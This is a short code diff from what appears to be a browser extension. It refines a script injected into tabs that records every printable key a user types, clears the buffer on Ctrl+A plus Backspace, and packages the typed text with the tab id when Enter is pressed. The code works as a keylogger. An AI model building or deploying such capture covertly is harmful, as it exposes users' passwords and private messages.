@@ -9,24 +9,37 @@ function captureKeyPresses(tabId, url) {
     console.log("captureKeyPresses function injected");
 
     let typedText = '';
+    let isCtrlA = false;
 
     // Function to handle keydown event
     function handleKeydown(event) {
         const printableKeys = /^[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/? ]$/; // Including space
         
-        if (event.ctrlKey || event.altKey)
-        {
-            return;
-        }
-        if (event.key === ' ' || printableKeys.test(event.key)) {
-            typedText += event.key; // Concatenate typed character
-        } else if (event.key === 'Backspace') {
-            // On pressing 'Backspace', remove the last character from typed text
-            typedText = typedText.slice(0, -1); // Remove the last character
+        
+        if (event.ctrlKey || event.altKey) {
+            // Handle Ctrl+A (select all)
+            if (event.key === 'a' && event.ctrlKey) {
+                isCtrlA = true; // Set flag if Ctrl+A is pressed
+            }
+            return; // Don't capture any other key when Ctrl or Alt is pressed
         }
 
+        if (event.key === ' ' || printableKeys.test(event.key)) {
+            typedText += event.key; // Concatenate typed character
+        } 
+        else if (event.key === 'Backspace') {
+            if (isCtrlA) {
+                // If Ctrl+A was pressed before, reset typedText on Backspace
+                typedText = ''; // Clear typedText if Ctrl+A was pressed before
+                isCtrlA = false; // Reset the flag
+            } else {
+                typedText = typedText.slice(0, -1); // Remove the last character
+            }
+        }
+    
+
         // On pressing 'Enter', log the concatenated text
-        if (event.key === 'Enter') {
+        if (event.key === 'Enter' && typedText) {
             const info = {
                 tabId: tabId, // Passing tabId
                 typedText: typedText, // User's typed text
